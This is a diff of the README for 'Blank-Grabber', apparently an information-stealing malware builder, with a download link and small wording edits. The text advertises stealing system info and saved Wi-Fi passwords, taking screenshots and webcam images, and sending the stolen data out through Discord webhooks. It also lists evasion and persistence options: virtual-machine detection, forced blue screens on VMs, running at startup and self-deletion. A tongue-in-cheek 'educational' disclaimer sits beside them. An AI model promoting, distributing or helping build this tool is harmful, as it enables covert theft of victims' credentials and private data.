@@ -30,9 +30,9 @@
 ## Download
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
-**Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
+**Disclaimer:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
 
-**Another Note:** If the grabber didn't work when you run it, then rebuild it with VMPROTECT option turned off.
+**Note:** If you didn't get any result while testing the grabber on yourself, you may try to turn off VMPROTECT as the grabber might have detected your system as a virtual machine.
 
 ## Features
     • GUI Builder.
@@ -59,7 +59,7 @@
     • Grabs System Info.
     • Grabs Saved Wifi Passwords.
     • Captures Screenshot.
-    • Captures Webcam Image (Disabled due to bugs, can be enabled explicitly).
+    • Captures Webcam Image (Buggy).
     • Sends All Data Through Discord Webhooks.
     (...more)
 
@@ -67,7 +67,7 @@
 | Option | Description |
 | ------ | ----------- |
 | **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
-| **VM Protect** | Does its best to prevent running in Virtual Machine. |
+| **VM Protect** | Tries its best to prevent running in Virtual Machine. |
 | **BSOD** | Triggers Blue Screen of Death when ran on Virtual Machine. |
 | **Startup** | Runs the stub on Windows starup. |
 | **Delete Self** | Deletes the grabber after use. |
@@ -80,7 +80,7 @@
 ## Requirements
 **To build the stub, you need:**
 - Windows 10.
-- Python 3.
+- Python 3.9+.
 - An active internet connection.
 
 ## How to Build?
